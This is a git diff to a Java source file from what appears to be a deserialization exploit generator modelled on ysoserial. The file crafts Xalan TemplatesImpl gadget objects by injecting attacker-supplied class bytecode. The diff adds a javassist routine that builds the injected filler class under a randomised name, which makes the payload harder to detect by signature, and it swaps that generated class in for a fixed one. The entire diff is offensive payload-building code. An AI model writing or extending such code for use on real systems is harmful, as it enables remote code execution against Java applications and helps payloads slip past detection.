@@ -17,6 +17,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
+import javassist.CtField;
 
 import java.io.FileInputStream;
 import java.io.Serializable;
@@ -265,8 +266,7 @@ public class TemplatesImpl {
         return createTemplatesImpl(classBytes, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
-    public static class PPP implements Serializable {
-
+    public static class Whoopsunix implements Serializable {
         private static final long serialVersionUID = 8207363842866235160L;
     }
 
@@ -274,9 +274,13 @@ public class TemplatesImpl {
             throws Exception {
         final T templates = tplClass.newInstance();
 
+        byte[] pppBytes = createRandomNameClass();
+
+
         // inject class bytes into instance
         Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
-                classBytes, ClassFiles.classAsBytes(PPP.class)
+//                classBytes, ClassFiles.classAsBytes(Whoopsunix.class)
+                classBytes, pppBytes
         });
 
         // required to make TemplatesImpl happy
@@ -288,8 +292,20 @@ public class TemplatesImpl {
         return templates;
     }
 
+    public static byte[] createRandomNameClass() throws Exception{
+        Printer.blueInfo("_bytecodes[1] make");
+        ClassPool classPool = ClassPool.getDefault();
+        CtClass ctClass = classPool.makeClass("Whoopsunix");
+        ctClass.addInterface(classPool.get("java.io.Serializable"));
+        ctClass.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", ctClass));
+
+        JavaClassHelper javaClassHelper = new JavaClassHelper();
+        javaClassHelper.setRandomJavaClassName(true);
+        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper);
+    }
+
     public static void main(String[] args) {
-        byte[] bytes = ClassFiles.classAsBytes(PPP.class);
+        byte[] bytes = ClassFiles.classAsBytes(Whoopsunix.class);
         System.out.println(bytes);
     }
 
